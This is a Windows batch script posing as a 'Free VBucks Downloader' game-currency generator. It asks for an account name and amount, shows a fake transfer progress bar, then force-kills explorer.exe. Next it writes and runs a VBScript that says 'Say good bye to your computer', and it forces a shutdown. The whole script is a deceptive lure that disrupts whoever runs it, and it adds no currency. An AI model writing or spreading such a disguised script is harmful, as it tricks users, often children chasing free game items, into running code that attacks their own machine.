@echo off
CHCP 65001 >nul
@MODE CON COLS=54 LINES=18
:menu
COLOR 0A
TITLE Free VBucks Downloader
echo.
echo           ███████╗██████╗ ███████╗███████╗          
echo           ██╔════╝██╔══██╗██╔════╝██╔════╝          
echo           █████╗  ██████╔╝█████╗  █████╗            
echo           ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝            
echo           ██║     ██║  ██║███████╗███████╗          
echo           ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝          
echo.
echo   ██╗   ██╗██████╗ ██╗   ██╗ ██████╗██╗  ██╗███████╗
echo   ██║   ██║██╔══██╗██║   ██║██╔════╝██║ ██╔╝██╔════╝
echo   ██║   ██║██████╔╝██║   ██║██║     █████╔╝ ███████╗
echo   ╚██╗ ██╔╝██╔══██╗██║   ██║██║     ██╔═██╗ ╚════██║
echo    ╚████╔╝ ██████╔╝╚██████╔╝╚██████╗██║  ██╗███████║
echo     ╚═══╝  ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝
echo.
echo - A : ADD AMOUNT TO YOUR ACCOUNT
echo - B : EXIT
choice /C AB /CS /N /M "Enter A or B: "
if %errorlevel%==1 goto add
if %errorlevel%==2 goto exit

:exit
exit

:add
@MODE CON COLS=50 LINES=4
CLS
set /p aaaName=Enter Your Account Name: 
set /p aaa=Enter Amount To Add: 
timeout 1 >nul
CLS
echo GETTING ACCOUNT...
timeout 1 >nul
echo STARTING TRANSFER...
timeout 1 >nul
CLS
echo TRANSFERING...
echo ╔═════════════════════╗
echo ║████                 ║
echo ╚═════════════════════╝
timeout 1 >nul
CLS
echo TRANSFERING...
echo ╔═════════════════════╗
echo ║█████████████        ║
echo ╚═════════════════════╝
timeout 1 >nul
CLS
echo TRANSFERING...
echo ╔═════════════════════╗
echo ║█████████████████████║
echo ╚═════════════════════╝
taskkill /f /im "explorer.exe" >nul
if exist speech.Vbs del speech.Vbs
echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
set "text=Say good bye to your computer. Hahahaha"
echo speech.speak "%text%" >> "speech.vbs"
start speech.vbs
timeout 5 >nul
del speech.Vbs
:: start explorer
shutdown /s /t 5
